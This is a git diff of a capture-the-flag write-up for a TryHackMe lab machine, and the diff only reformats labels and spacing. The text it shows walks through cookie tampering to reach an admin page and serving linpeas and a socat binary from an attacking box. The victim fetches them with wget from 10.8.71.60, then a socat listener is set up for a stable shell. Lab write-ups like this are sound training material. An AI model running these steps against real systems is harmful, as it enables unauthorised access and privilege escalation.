@@ -66,6 +66,8 @@ We can use the browser dev kit or a cookie extention to add the cookie to our br
 
 ![alt text](img/add.png?raw=true "add")
 
+
+
 ![alt text](img/admin.png?raw=true "admin")
 
 ### There's the first flag
@@ -134,11 +136,11 @@ It is time for us to find a way to escalate our privilages.
 We can start the process with some linux enum scripts. I usualy use this [linpeas script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
 Since we cannot acces the internet on the THM boxes we need to again setup a simple http server and transfer over the script inside a dir where we have write permissions.
 
-*attacking box*
+#### attacking box
 
 ```python3 -m http.server 4013```
 
-*victim box*
+####  victim box
 
 ```wget http://10.8.71.60:4013/linpeas.sh```
 
@@ -201,19 +203,19 @@ We are going to use a technique where we transfer over a precompiled binary of t
 
 after that:
 
-*attacking box*
+####  attacking box
 
 ```python3 -m http.server 4013```
 
-*victim unstable shell*
+#### victim unstable shell
 
 ```wget http://10.8.71.60:4013/socat```
 
-*attacking box*
+#### attacking box 
 
 ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
 
-*victim unstable shell*
+####  victim unstable shell
 
 ```chmod 777 ./socat```
 
